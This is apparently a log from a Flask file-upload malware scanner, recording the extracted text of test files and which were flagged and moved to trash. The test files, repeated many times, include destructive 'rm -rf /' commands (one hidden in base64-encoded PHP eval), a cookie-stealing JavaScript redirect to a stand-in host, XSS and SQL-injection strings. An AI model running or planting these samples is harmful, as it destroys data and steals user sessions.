    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:47,433 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,436 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:51:47,436 - [33mPress CTRL+C to quit[0m
2025-02-22 20:51:52,405 - 127.0.0.1 - - [22/Feb/2025 20:51:52] "GET / HTTP/1.1" 200 -
2025-02-22 20:51:57,291 - 127.0.0.1 - - [22/Feb/2025 20:51:57] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:51:57,294 - 127.0.0.1 - - [22/Feb/2025 20:51:57] "GET / HTTP/1.1" 200 -
2025-02-22 20:52:03,007 - 127.0.0.1 - - [22/Feb/2025 20:52:03] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:52:03,014 - 127.0.0.1 - - [22/Feb/2025 20:52:03] "GET / HTTP/1.1" 200 -
2025-02-22 20:53:49,002 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:53:49,004 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:53:49,005 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:53:49,007 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:53:49,008 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,008 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/trash/3.py
2025-02-22 20:53:49,008 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,009 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,010 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,010 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/trash/4.php
2025-02-22 20:53:49,010 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,011 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,013 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,014 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:53:49,016 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,017 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,018 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:53:49,019 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:53:49,020 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:53:49,022 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:53:49,023 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,023 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py
2025-02-22 20:53:49,023 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,024 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,025 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,025 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php
2025-02-22 20:53:49,025 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,026 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,027 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,028 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:53:49,030 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,031 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,032 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:53:49,033 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:53:49,035 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:53:49,036 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:53:49,037 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,037 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py
2025-02-22 20:53:49,037 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,038 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,039 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,040 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php
2025-02-22 20:53:49,040 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,043 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:53:49,045 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,046 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,047 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,047 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py
2025-02-22 20:53:49,047 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,048 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,048 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php
2025-02-22 20:53:49,048 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,050 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,052 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:53:49,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:53:49,056 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-22 20:53:49,056 - Moved text_hidden_yaml.yaml to trash due to suspicious content.
2025-02-22 20:53:49,057 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,059 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,059 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py
2025-02-22 20:53:49,059 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,060 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,060 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php
2025-02-22 20:53:49,060 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,062 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,063 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,064 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,066 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:53:49,068 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,069 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:53:49,069 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-22 20:53:49,069 - Moved text_hidden_yaml.yaml to trash due to suspicious content.
2025-02-22 20:53:49,071 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,072 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,072 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py
2025-02-22 20:53:49,072 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,073 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,074 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php
2025-02-22 20:53:49,074 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,075 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,076 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,078 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,079 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:53:49,080 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,082 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:53:49,082 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-22 20:53:49,082 - Moved text_hidden_yaml.yaml to trash due to suspicious content.
2025-02-22 20:53:49,083 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,085 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-22 20:53:49,085 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py
2025-02-22 20:53:49,085 - Moved create_malicious_xlsx.py to trash due to suspicious content.
2025-02-22 20:53:49,086 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:53:49,088 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/app.py: from flask import Flask, render_template, request, redirect, url_for, flash
import os
import sqlite3
import re
import logging
import zipfile
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['TRASH_FOLDER'] = 'trash'
app.config['ALLOWED_EXTENSIONS'] = {"docx", "xls", "xlsx", "ppt", "pptx", "odt", "txt", "py", "js", "c", "java", "zip", "r", "bsv", "yaml", "xml", "word", "xl", "xss", 
2025-02-22 20:53:49,089 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/app.py
2025-02-22 20:53:49,089 - Moved app.py to trash due to suspicious content.
2025-02-22 20:53:49,090 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/create_malicious_pptx.py: from pptx import Presentation

def create_malicious_pptx(filename):
    # Create a new Presentation
    ppt = Presentation()
    
    # Add a slide
    slide = ppt.slides.add_slide(ppt.slide_layouts[5])  # Title Slide layout
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "<script>alert('XSS');</script>",
        "eval('some malicious code');"
    ]
    
    for line in suspicious_content:

2025-02-22 20:53:49,090 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/create_malicious_pptx.py
2025-02-22 20:53:49,091 - Moved create_malicious_pptx.py to trash due to suspicious content.
2025-02-22 20:53:49,100 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 20:53:49,100 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/malicious.xlsx
2025-02-22 20:53:49,100 - Moved malicious.xlsx to trash due to suspicious content.
2025-02-22 20:53:49,112 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 20:53:49,113 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/malicious.pptx
2025-02-22 20:53:49,113 - Moved malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,115 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:53:49,117 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:53:49,119 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:53:49,121 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,121 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/3.py
2025-02-22 20:53:49,121 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,137 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-22 20:53:49,137 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/test_doc_hidden.docx
2025-02-22 20:53:49,137 - Moved test_doc_hidden.docx to trash due to suspicious content.
2025-02-22 20:53:49,139 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:53:49,146 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,147 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:53:49,147 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,148 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,148 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/4.php
2025-02-22 20:53:49,148 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,149 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

